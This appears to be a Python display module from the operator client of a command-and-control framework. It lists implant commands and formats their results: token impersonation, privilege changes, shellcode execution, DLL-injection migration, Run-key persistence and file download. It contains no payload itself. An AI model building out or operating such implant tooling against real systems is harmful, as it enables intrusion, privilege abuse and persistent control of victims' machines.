import os
import struct
import time

from commands import CMD_IDS, CMD_NAMES, COMMAND_SPECS
from errors import ERROR_MESSAGES

TOKEN_SUMMARY_HEADER_SIZE = 16


# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------

def display_help():
    """Print the operator help menu."""
    print("\nLocal client commands:")
    print(f"  {'help':<30} Display this help menu")
    print(f"  {'exit':<30} Close the operator client")
    print(f"  {'pending':<30} List queued or leased tasks")
    print(f"  {'history':<30} List all known tasks and their status")
    print(f"  {'check <task_id>':<30} Query a task result by task id")

    print("\nImplant commands:")
    categories = [
        ("Token / identity",
         ["inspect-token", "impersonate-token", "enable-privilege",
          "disable-privilege", "hostname", "whoami"]),
        ("Filesystem",
         ["ls", "cat", "mkdir", "rm", "upload", "download"]),
        ("System enumeration",
         ["ps", "getpid"]),
        ("Execution",
         ["exec", "shellcode-exec"]),
        ("Memory / objects",
         ["mem-read", "module-list", "handle-list"]),
        ("Environment",
         ["env", "get-env", "set-env"]),
        ("Implant management",
         ["sleep", "kill", "persist", "unpersist", "migrate"]),
    ]

    spec_map = {s["name"]: s for s in COMMAND_SPECS}

    for category, names in categories:
        print(f"\n  [{category}]")
        for name in names:
            spec = spec_map.get(name)
            if spec:
                print(f"    {spec['usage']:<38} {spec['description']}")


# ---------------------------------------------------------------------------
# Token command display handlers
# ---------------------------------------------------------------------------

def display_inspect_token(payload):
    if len(payload) < 8:
        print(f"[!] inspect-token payload too short: {len(payload)} bytes")
        return

    SE_PRIVILEGE_ENABLED            = 0x00000002
    SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001
  
    
    if len(payload) < TOKEN_SUMMARY_HEADER_SIZE:
        print(f"[!] current-token payload too short: {len(payload)} bytes")
        return

    elevated, impersonated, user_name_length, user_sid_length = struct.unpack(
        "<IIII",
        payload[:TOKEN_SUMMARY_HEADER_SIZE],
    )
    total_length = TOKEN_SUMMARY_HEADER_SIZE + user_name_length + user_sid_length
    if len(payload) < total_length:
        print(f"[!] current-token payload incomplete: {len(payload)} bytes")
        return

    user_name = payload[
        TOKEN_SUMMARY_HEADER_SIZE:TOKEN_SUMMARY_HEADER_SIZE + user_name_length
    ].decode("utf-16le").rstrip("\x00")
    user_sid_offset = TOKEN_SUMMARY_HEADER_SIZE + user_name_length
    user_sid = payload[user_sid_offset:user_sid_offset + user_sid_length].decode(
        "utf-16le"
    ).rstrip("\x00")

    print(f"  username       : {user_name}")
    print(f"  user_sid       : {user_sid}")
    print(f"  elevated       : {'yes' if elevated else 'no'}")
    print(f"  impersonated   : {'yes' if impersonated else 'no'}")



def display_impersonate_token(payload):
    if len(payload) < 4:
        print(f"[!] impersonate-token payload too short: {len(payload)} bytes")
        return

    target_pid      = struct.unpack("<I", payload[:4])[0]
    summary_payload = payload[4:]

    HDR = 8
    if len(summary_payload) < HDR:
        print(f"[!] impersonate-token summary too short: {len(summary_payload)} bytes")
        return

    impersonated, user_name_length = struct.unpack("<II", summary_payload[:HDR])
    if len(summary_payload) < HDR + user_name_length:
        print(f"[!] impersonate-token payload incomplete")
        return

    user_name = summary_payload[HDR:HDR + user_name_length].decode("utf-16le").rstrip("\x00")
    print(f"  pid                  : {target_pid}")
    print(f"  impersonation_result : {'success' if impersonated else 'failed'}")
    print(f"  username             : {user_name}")


def display_enable_privilege(payload):
    if len(payload) < 12:
        print(f"[!] enable-privilege payload too short")
        return
    state, prev, name_length = struct.unpack("<III", payload[:12])
    priv_name = payload[12:12 + name_length].decode("utf-16le").rstrip("\x00")
    print(f"  privilege          : {priv_name}")
    print(f"  enable_result      : {'success' if state else 'failed'}")
    print(f"  previously_enabled : {'yes' if prev else 'no'}")


def display_disable_privilege(payload):
    if len(payload) < 12:
        print(f"[!] disable-privilege payload too short")
        return
    state, prev, name_length = struct.unpack("<III", payload[:12])
    priv_name = payload[12:12 + name_length].decode("utf-16le").rstrip("\x00")
    print(f"  privilege          : {priv_name}")
    print(f"  disable_result     : {'success' if state else 'failed'}")
    print(f"  previously_enabled : {'yes' if prev else 'no'}")


def display_hostname(payload):
    name = payload.decode("utf-16le").rstrip("\x00")
    print(f"  hostname : {name}")


def display_whoami(payload):
    if len(payload) < 4:
        print(f"[!] whoami payload too short")
        return
    is_admin = struct.unpack("<I", payload[:4])[0]
    username = payload[4:].decode("utf-16le").rstrip("\x00")
    print(f"  username : {username}")
    print(f"  is_admin : {'yes' if is_admin else 'no'}")


# ---------------------------------------------------------------------------
# Filesystem display handlers
# ---------------------------------------------------------------------------

def display_ls(payload):
    if len(payload) < 4:
        print("[!] ls payload too short")
        return

    count  = struct.unpack("<I", payload[:4])[0]
    offset = 4

    if count == 0:
        print("  (empty directory)")
        return

    print(f"  {'type':<6} {'size':>14}  name")
    print(f"  {'-'*6}  {'-'*14}  {'-'*40}")

    for _ in range(count):
        if offset + 16 > len(payload):
            break
        type_flag  = struct.unpack("<I",  payload[offset:offset + 4])[0];  offset += 4
        size       = struct.unpack("<Q",  payload[offset:offset + 8])[0];  offset += 8
        name_bytes = struct.unpack("<I",  payload[offset:offset + 4])[0];  offset += 4
        name = payload[offset:offset + name_bytes].decode("utf-16le").rstrip("\x00")
        offset += name_bytes

        type_str = "dir " if type_flag else "file"
        if type_flag:
            size_str = "-"
        else:
            size_str = f"{size:,}"
        print(f"  {type_str:<6} {size_str:>14}  {name}")


def display_cat(payload):
    if not payload:
        print("  (empty file)")
        return
    for encoding in ("utf-8", "utf-16le", "cp1252"):
        try:
            text = payload.decode(encoding)
            print(text)
            return
        except UnicodeDecodeError:
            continue
    # Fallback: hex dump
    print(f"  [binary content, {len(payload)} bytes]")
    for i in range(0, min(len(payload), 256), 16):
        chunk = payload[i:i + 16]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        print(f"  {i:04x}  {hex_part}")


def display_mkdir(payload):
    print("  Directory created.")


def display_rm(payload):
    print("  Deleted.")


def display_upload(payload):
    print("  File uploaded successfully.")


def display_download(payload):
    if len(payload) < 4:
        print("[!] download payload too short")
        return

    name_bytes = struct.unpack("<I", payload[:4])[0]
    name       = payload[4:4 + name_bytes].decode("utf-16le").rstrip("\x00")
    file_data  = payload[4 + name_bytes:]

    # Save alongside the operator client script.
    save_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
    with open(save_path, "wb") as fh:
        fh.write(file_data)

    print(f"  Saved {len(file_data):,} bytes → {save_path}")


# ---------------------------------------------------------------------------
# System enumeration display handlers
# ---------------------------------------------------------------------------

def display_ps(payload):
    if len(payload) < 4:
        print("[!] ps payload too short")
        return

    count  = struct.unpack("<I", payload[:4])[0]
    offset = 4

    print(f"  {'PID':>7}  Image name")
    print(f"  {'-'*7}  {'-'*40}")

    for _ in range(count):
        if offset + 8 > len(payload):
            break
        pid        = struct.unpack("<I", payload[offset:offset + 4])[0]; offset += 4
        name_bytes = struct.unpack("<I", payload[offset:offset + 4])[0]; offset += 4
        name = payload[offset:offset + name_bytes].decode("utf-16le").rstrip("\x00")
        offset += name_bytes
        print(f"  {pid:>7}  {name}")


def display_getpid(payload):
    if len(payload) < 4:
        print("[!] getpid payload too short")
        return
    pid = struct.unpack("<I", payload[:4])[0]
    print(f"  pid : {pid}")


# ---------------------------------------------------------------------------
# Execution display handlers
# ---------------------------------------------------------------------------

def display_exec(payload):
    if len(payload) < 8:
        print("[!] exec payload too short")
        return
    exit_code   = struct.unpack("<I", payload[:4])[0]
    output_len  = struct.unpack("<I", payload[4:8])[0]
    raw_output  = payload[8:8 + output_len]

    for enc in ("utf-8", "cp1252", "latin-1"):
        try:
            text = raw_output.decode(enc)
            break
        except UnicodeDecodeError:
            text = None
    if text is None:
        text = raw_output.decode("latin-1")

    print(f"  exit_code : {exit_code}")
    print("  output    :")
    for line in text.splitlines():
        print(f"    {line}")


def display_shellcodeexec(payload):
    print("  Shellcode injected and thread created.")


# ---------------------------------------------------------------------------
# Memory / object inspection display handlers
# ---------------------------------------------------------------------------

def display_memread(payload):
    if not payload:
        print("  (no data returned)")
        return
    print(f"  {len(payload)} bytes:")
    for i in range(0, len(payload), 16):
        chunk    = payload[i:i + 16]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        asc_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"  {i:04x}  {hex_part:<48}  {asc_part}")


def display_modulelist(payload):
    if len(payload) < 4:
        print("[!] modulelist payload too short")
        return

    count  = struct.unpack("<I", payload[:4])[0]
    offset = 4

    print(f"  {'Base address':<20}  Module")
    print(f"  {'-'*20}  {'-'*40}")

    for _ in range(count):
        if offset + 12 > len(payload):
            break
        base       = struct.unpack("<Q", payload[offset:offset + 8])[0]; offset += 8
        name_bytes = struct.unpack("<I", payload[offset:offset + 4])[0]; offset += 4
        name = payload[offset:offset + name_bytes].decode("utf-16le").rstrip("\x00")
        offset += name_bytes
        print(f"  0x{base:016x}  {name}")


def display_handlelist(payload):
    if len(payload) < 4:
        print("[!] handlelist payload too short")
        return

    count  = struct.unpack("<I", payload[:4])[0]
    offset = 4

    print(f"  {'Handle':>8}  {'Type idx':>8}  {'Access':>10}")
    print(f"  {'-'*8}  {'-'*8}  {'-'*10}")

    for _ in range(count):
        if offset + 12 > len(payload):
            break
        handle  = struct.unpack("<I", payload[offset:offset + 4])[0]; offset += 4
        typeidx = struct.unpack("<I", payload[offset:offset + 4])[0]; offset += 4
        access  = struct.unpack("<I", payload[offset:offset + 4])[0]; offset += 4
        print(f"  {handle:>8}  {typeidx:>8}  0x{access:08x}")


# ---------------------------------------------------------------------------
# Environment display handlers
# ---------------------------------------------------------------------------

def display_env(payload):
    if not payload:
        print("  (no environment variables)")
        return
    try:
        text = payload.decode("utf-16le")
    except UnicodeDecodeError:
        print("[!] env payload decode error")
        return
    entries = [e for e in text.split("\x00") if e]
    for entry in entries:
        print(f"  {entry}")


def display_getenv(payload):
    if not payload:
        print("  (not set)")
        return
    value = payload.decode("utf-16le").rstrip("\x00")
    print(f"  value : {value}")


def display_setenv(payload):
    print("  Environment variable set.")


# ---------------------------------------------------------------------------
# Implant management display handlers
# ---------------------------------------------------------------------------

def display_sleep(payload):
    print("  Sleep interval updated.")


def display_kill(payload):
    print("  Kill scheduled — implant will stop after posting this result.")


def display_persist(payload):
    print("  Persistence installed (HKCU\\...\\Run\\HanksRevenge).")


def display_unpersist(payload):
    print("  Persistence removed.")


def display_migrate(payload):
    print("  DLL injection complete — implant now running in target process.")

# ---------------------------------------------------------------------------
# Fun Stuff
# ---------------------------------------------------------------------------

def display_hank(payload):
    print("  Hanking complete.")


# ---------------------------------------------------------------------------
# Dispatch table
# ---------------------------------------------------------------------------

DISPLAY_HANDLERS = {
    CMD_IDS["inspect-token"]:    display_inspect_token,
    CMD_IDS["impersonate-token"]: display_impersonate_token,
    CMD_IDS["enable-privilege"]: display_enable_privilege,
    CMD_IDS["disable-privilege"]: display_disable_privilege,
    CMD_IDS["hostname"]:         display_hostname,
    CMD_IDS["whoami"]:           display_whoami,

    CMD_IDS["ls"]:               display_ls,
    CMD_IDS["cat"]:              display_cat,
    CMD_IDS["mkdir"]:            display_mkdir,
    CMD_IDS["rm"]:               display_rm,
    CMD_IDS["upload"]:           display_upload,
    CMD_IDS["download"]:         display_download,

    CMD_IDS["ps"]:               display_ps,
    CMD_IDS["getpid"]:           display_getpid,

    CMD_IDS["exec"]:             display_exec,
    CMD_IDS["shellcode-exec"]:    display_shellcodeexec,

    CMD_IDS["mem-read"]:          display_memread,
    CMD_IDS["module-list"]:       display_modulelist,
    CMD_IDS["handle-list"]:       display_handlelist,

    CMD_IDS["env"]:              display_env,
    CMD_IDS["get-env"]:           display_getenv,
    CMD_IDS["set-env"]:           display_setenv,

    CMD_IDS["sleep"]:            display_sleep,
    CMD_IDS["kill"]:             display_kill,
    CMD_IDS["persist"]:          display_persist,
    CMD_IDS["unpersist"]:        display_unpersist,
    CMD_IDS["migrate"]:          display_migrate,
    CMD_IDS["hank"]:          display_hank,
}


def display_result(command_id, status, payload):
    """Dispatch a completed task result to the correct display handler."""
    print(
        f"\n[result] type={CMD_NAMES.get(command_id, command_id)} "
        f"status=0x{status:08X}"
    )
    if status != 0:
        print(f"  error : {ERROR_MESSAGES.get(status, f'Windows error 0x{status:08X}')}")
        return

    handler = DISPLAY_HANDLERS.get(command_id)
    if handler is None:
        print("[!] No display handler registered for this command.")
        print(f"  payload_length : {len(payload)}")
        if payload:
            print(f"  payload_hex    : {payload[:64].hex()}{'...' if len(payload) > 64 else ''}")
        return

    handler(payload)
